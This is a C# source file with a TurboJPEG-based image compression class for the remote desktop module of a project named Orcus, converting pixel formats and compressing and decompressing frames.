using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using Orcus.Shared.Utilities.Compression;
using TurboJpegWrapper;

namespace Orcus.Commands.RemoteDesktop.Compression
{
    public class TurboJpgImageCompression : IImageCompression
    {
        private readonly bool _decompress;
        private readonly TJCompressor _compressor;
        private readonly TJDecompressor _decompressor;

        public TurboJpgImageCompression(bool decompress)
        {
            _decompress = decompress;

            if (decompress)
                _decompressor = new TJDecompressor();
            else
                _compressor = new TJCompressor();

        }

        public void Dispose()
        {
            if (_decompress)
                _decompressor.Dispose();
            else
                _compressor.Dispose();
        }

        public int Quality { get; set; }
        public CompressionMode CompressionMode { get; } = CompressionMode.ByteArray;
        public DecompressionMode DecompressionMode { get; } = DecompressionMode.ByteArray | DecompressionMode.Pointer;

        public void Compress(IntPtr scan0, int stride, Size imageSize, PixelFormat pixelFormat, Stream outStream)
        {
            throw new NotImplementedException();
        }

        public void Compress(Bitmap bitmap, Stream outStream)
        {
            throw new NotImplementedException();
        }

        public byte[] Compress(IntPtr scan0, int stride, Size imageSize, PixelFormat pixelFormat)
        {
            return _compressor.Compress(scan0, stride, imageSize.Width, imageSize.Height, pixelFormat,
                TJSubsamplingOptions.TJSAMP_444, Quality, TJFlags.FASTDCT);
        }

        public void Decompress(IntPtr dataPtr, uint length, IntPtr outputPtr, int outputLength, PixelFormat pixelFormat)
        {
            int width;
            int height;
            int stride;

            _decompressor.Decompress(dataPtr, length, outputPtr, outputLength, ConvertPixelFormat(pixelFormat),
                TJFlags.NONE, out width, out height, out stride);
        }

        public byte[] Decompress(IntPtr dataPtr, uint length, PixelFormat pixelFormat)
        {
            int width;
            int height;
            int stride;

            return _decompressor.Decompress(dataPtr, length, ConvertPixelFormat(pixelFormat),
                TJFlags.FASTDCT, out width, out height, out stride);
        }

        public Bitmap Decompress()
        {
            throw new NotImplementedException();
        }

        private static TJPixelFormats ConvertPixelFormat(PixelFormat pixelFormat)
        {
            switch (pixelFormat)
            {
                case PixelFormat.Format32bppArgb:
                    return TJPixelFormats.TJPF_BGRA;
                case PixelFormat.Format24bppRgb:
                    return TJPixelFormats.TJPF_BGR;
                case PixelFormat.Format8bppIndexed:
                    return TJPixelFormats.TJPF_GRAY;
                default:
                    throw new NotSupportedException($"Provided pixel format \"{pixelFormat}\" is not supported");
            }
        }
    }
}